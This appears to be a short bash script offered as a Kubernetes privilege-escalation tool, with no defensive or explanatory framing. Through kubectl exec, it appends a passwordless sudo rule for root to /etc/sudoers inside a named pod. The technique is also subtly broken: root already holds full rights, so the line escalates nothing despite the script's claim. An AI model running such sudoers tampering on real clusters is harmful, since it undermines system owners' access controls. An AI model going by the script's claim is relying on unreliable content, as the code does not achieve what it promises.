#!/bin/bash
# Escalate privileges in Kubernetes
# Usage: k8s_priv_esc.sh <pod_name> <namespace>

POD_NAME=$1
NAMESPACE=$2

if [ -z "$POD_NAME" ] || [ -z "$NAMESPACE" ]; then
    echo "Usage: $0 <pod_name> <namespace>"
    exit 1
fi

echo "Escalating privileges in pod: $POD_NAME in namespace: $NAMESPACE"

kubectl exec -it $POD_NAME -n $NAMESPACE -- /bin/sh -c "echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
